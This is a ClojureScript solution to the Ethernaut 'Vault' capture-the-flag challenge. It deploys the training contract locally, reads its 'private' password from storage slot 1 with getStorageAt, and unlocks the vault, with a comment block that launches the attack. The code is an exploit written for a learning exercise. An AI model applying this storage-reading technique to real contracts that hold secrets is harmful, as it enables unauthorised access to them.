(ns ctf.ethernaut.vault
  "The Vault keeps the \"password\" in private vars.

  Nothing is private on the blockchain!

  We can exploit it my using `getStorageAt` to extract the password.

  To call `getStorageAt` we must know the storage slot where
  the actual password is stored. Since its takes 256 bits to store that
  password. It will get its own slot. And it will be after the the 1st slot.
  The first slot stores a `bool` called `locked`.


  (link to storage slots details)"
  (:require [ctf.ethernaut.utils :as u]
            [ctf.ethernaut.wallets :as w]
            [cljs.core.async :as a]
            [cljs.core.async.interop :refer-macros [<p!]]))



(defn deploy-vault!
  "Owner deploys the Vault contract with that player needs to attack!
   Returns the `js/Promise`."
  [password]
  (let [contract (u/contract :vault
                             w/local-wallet)]
    (.deploy contract password)))



(defn privacy-attack
  "Async Go block to trigger the attack"
  [pswd-text]
  (a/go
    (try
      (let [vault          (<p! (deploy-vault! (u/text->bytes32 pswd-text)))
            pswd-slot      1
            pswd           (<p! (.getStorageAt w/local-provider
                                               (.-address vault)
                                               pswd-slot))
            before-locked? (<p! (.locked vault))
            _              (<p! (.unlock vault pswd))
            after-locked?  (<p! (.locked vault))
            _ (def _before-locked? before-locked?)
            _ (def _after-locked? after-locked?)]
        [before-locked?, after-locked?])
      (catch js/Error err
        (js/console.log (ex-cause err))))))



(comment

  ;; Execute this block to launch the attack
  (a/take! (privacy-attack "abc124") #(prn %))



  (deploy-vault! (u/text->bytes32 "abc124"))

  (.getStorageAt w/local-provider (.-address _vault) 1)

  (.unlock _vault
           "0x6162633132340000000000000000000000000000000000000000000000000000")


  )
